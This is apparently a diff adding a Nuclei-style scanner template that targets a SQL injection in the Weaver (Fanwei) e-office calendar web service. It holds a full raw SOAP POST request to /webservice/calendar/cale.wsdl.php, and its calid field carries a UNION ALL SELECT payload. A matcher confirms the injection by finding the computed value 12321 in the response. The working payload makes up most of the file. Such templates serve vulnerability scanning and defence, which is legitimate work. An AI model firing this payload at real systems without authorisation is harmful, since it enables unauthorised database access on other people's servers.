@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - dsl:
+            - contains_all(body,'12321')
+          type: dsl
+      raw:
+        - |
+          POST /webservice/calendar/cale.wsdl.php HTTP/1.1
+          Host: {{Hostname}}
+          User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+          SOAPAction: urn:CaleServicewsdl#getPreNextCalendar
+          Content-type: text/xml;charset=UTF-8
+          Content-Length: 738
+
+          <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CaleServicewsdl">
+             <soapenv:Header/>
+             <soapenv:Body>
+             <urn:getPreNextCalendar soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                    <calid xsi:type="xsd:string">gero et&apos; UNION ALL SELECT CONCAT(0x716a627671,IFNULL(CAST(111*111 AS NCHAR),0x20),0x7178767871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#</calid>
+                   <flag xsi:type="xsd:string">sonoras imperio</flag>
+                </urn:getPreNextCalendar>
+             </soapenv:Body>
+          </soapenv:Envelope>
+id: fanwei-eoffice-wsdl-sqli
+info:
+    author: fanwei-eoffice-wsdl-sqli
+    name: fanwei-eoffice-wsdl-sqli
+    tags:
+        - Eserv
+        - eserv
